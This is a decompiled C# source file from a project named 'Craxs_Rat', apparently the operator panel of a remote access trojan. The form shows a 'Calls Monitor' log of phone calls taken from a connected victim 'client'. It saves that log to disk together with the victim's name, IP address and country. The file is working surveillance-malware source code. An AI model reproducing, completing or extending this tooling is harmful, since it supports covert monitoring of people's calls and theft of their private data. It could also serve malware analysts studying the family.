using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;
using Vip.Notification;

namespace Craxs_Rat
{
	// Token: 0x02000021 RID: 33
	[DesignerGenerated]
	public partial class craxscallslog : Form
	{
		// Token: 0x06000205 RID: 517 RVA: 0x000109F4 File Offset: 0x0000EBF4
		public craxscallslog()
		{
			base.Load += this.craxscallslog_Load;
			base.Deactivate += this.craxscallslog_Deactivate;
			this.InitializeComponent();
		}

		// Token: 0x170000BF RID: 191
		// (get) Token: 0x06000208 RID: 520 RVA: 0x00002395 File Offset: 0x00000595
		// (set) Token: 0x06000209 RID: 521 RVA: 0x00011284 File Offset: 0x0000F484
		internal virtual TextBox callstext { get; set; }

		// Token: 0x170000C0 RID: 192
		// (get) Token: 0x0600020A RID: 522 RVA: 0x0000239D File Offset: 0x0000059D
		// (set) Token: 0x0600020B RID: 523 RVA: 0x00011298 File Offset: 0x0000F498
		internal virtual Panel Panel1 { get; set; }

		// Token: 0x170000C1 RID: 193
		// (get) Token: 0x0600020C RID: 524 RVA: 0x000023A5 File Offset: 0x000005A5
		// (set) Token: 0x0600020D RID: 525 RVA: 0x000112AC File Offset: 0x0000F4AC
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon2;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon2_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon2;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon2 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon2;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x170000C8 RID: 200
		// (get) Token: 0x0600020E RID: 526 RVA: 0x000023AD File Offset: 0x000005AD
		// (set) Token: 0x0600020F RID: 527 RVA: 0x000112F0 File Offset: 0x0000F4F0
		internal virtual DrakeUIToolTip ToolTips { get; set; }

		// Token: 0x170000C2 RID: 194
		// (get) Token: 0x06000210 RID: 528 RVA: 0x000023B5 File Offset: 0x000005B5
		// (set) Token: 0x06000211 RID: 529 RVA: 0x00011304 File Offset: 0x0000F504
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon1_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon1;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon1 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon1;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x170000C3 RID: 195
		// (get) Token: 0x06000212 RID: 530 RVA: 0x000023BD File Offset: 0x000005BD
		// (set) Token: 0x06000213 RID: 531 RVA: 0x00011348 File Offset: 0x0000F548
		internal virtual DrakeUIButtonIcon checkbutton
		{
			[CompilerGenerated]
			get
			{
				return this._checkbutton;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.checkbutton_Click);
				DrakeUIButtonIcon checkbutton = this._checkbutton;
				if (checkbutton != null)
				{
					checkbutton.Click -= value2;
				}
				this._checkbutton = value;
				checkbutton = this._checkbutton;
				if (checkbutton != null)
				{
					checkbutton.Click += value2;
				}
			}
		}

		// Token: 0x170000C4 RID: 196
		// (get) Token: 0x06000214 RID: 532 RVA: 0x000023C5 File Offset: 0x000005C5
		// (set) Token: 0x06000215 RID: 533 RVA: 0x0001138C File Offset: 0x0000F58C
		internal virtual Panel Panel5 { get; set; }

		// Token: 0x170000C5 RID: 197
		// (get) Token: 0x06000216 RID: 534 RVA: 0x000023CD File Offset: 0x000005CD
		// (set) Token: 0x06000217 RID: 535 RVA: 0x000113A0 File Offset: 0x0000F5A0
		internal virtual Panel Panel4 { get; set; }

		// Token: 0x170000C6 RID: 198
		// (get) Token: 0x06000218 RID: 536 RVA: 0x000023D5 File Offset: 0x000005D5
		// (set) Token: 0x06000219 RID: 537 RVA: 0x000113B4 File Offset: 0x0000F5B4
		internal virtual Panel Panel3 { get; set; }

		// Token: 0x170000C7 RID: 199
		// (get) Token: 0x0600021A RID: 538 RVA: 0x000023DD File Offset: 0x000005DD
		// (set) Token: 0x0600021B RID: 539 RVA: 0x000113C8 File Offset: 0x0000F5C8
		internal virtual Panel Panel2 { get; set; }

		// Token: 0x0600021C RID: 540 RVA: 0x000113DC File Offset: 0x0000F5DC
		private void craxscallslog_Load(object sender, EventArgs e)
		{
			base.Location = new Point(checked(Cursor.Position.X - 79), Cursor.Position.Y);
			this.BackColor = Color.DarkRed;
			base.TransparencyKey = Color.DarkRed;
			try
			{
				if (this.gclass8_0 != null)
				{
					if (this.gclass8_0.strings_0.Count<string>() > 0)
					{
						this.callstext.Text = "Calls Monitor...\r\nــــــــــــــــــــــ\r\n\r\n";
						foreach (string text in this.gclass8_0.strings_0)
						{
							try
							{
								if (text != null && text.Length > 0)
								{
									TextBox callstext;
									(callstext = this.callstext).Text = callstext.Text + text + "\r\nــــــــــــــــــــــ\r\n\r\n";
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					else
					{
						this.callstext.Text = "No New Calls...";
					}
				}
				this.gclass8_0.bool_6 = false;
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x0600021D RID: 541 RVA: 0x00011508 File Offset: 0x0000F708
		private void checkbutton_Click(object sender, EventArgs e)
		{
			this.callstext.Text = "";
			this.gclass8_0.strings_0 = new string[251];
			base.Close();
		}

		// Token: 0x0600021E RID: 542 RVA: 0x00011540 File Offset: 0x0000F740
		private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x0600021F RID: 543 RVA: 0x00011554 File Offset: 0x0000F754
		private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
			if (string.IsNullOrEmpty(this.callstext.Text))
			{
				Alert.ShowInformation("No log found to save");
			}
			else
			{
				try
				{
					if (!Directory.Exists(this.gclass8_0.string_10 + "\\Calls_Log"))
					{
						Directory.CreateDirectory(this.gclass8_0.string_10 + "\\Calls_Log");
					}
					string text = DateTime.Now.ToString("yyyy-MM-dd_HHmmss") + ".txt";
					if (!File.Exists(this.gclass8_0.string_10 + "\\Calls_Log\\" + text))
					{
						File.Create(this.gclass8_0.string_10 + "\\Calls_Log\\" + text).Dispose();
						File.AppendAllText(this.gclass8_0.string_10 + "\\Calls_Log\\" + text, string.Concat(new string[]
						{
							"Client Name: ",
							this.gclass8_0.string_8,
							"\r\nClient IP: ",
							this.gclass8_0.string_1,
							"\r\nCountry: ",
							this.gclass8_0.string_6,
							"\r\nDate :",
							DateTime.Now.ToString(),
							"\r\n----------------------------------------\r\n"
						}));
					}
					File.AppendAllText(this.gclass8_0.string_10 + "\\Calls_Log\\" + text, text + this.callstext.Text + "\r\n");
					Process.Start(this.gclass8_0.string_10 + "\\Calls_Log");
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000220 RID: 544 RVA: 0x00011540 File Offset: 0x0000F740
		private void craxscallslog_Deactivate(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x0400007D RID: 125
		public GClass8 gclass8_0;
	}
}
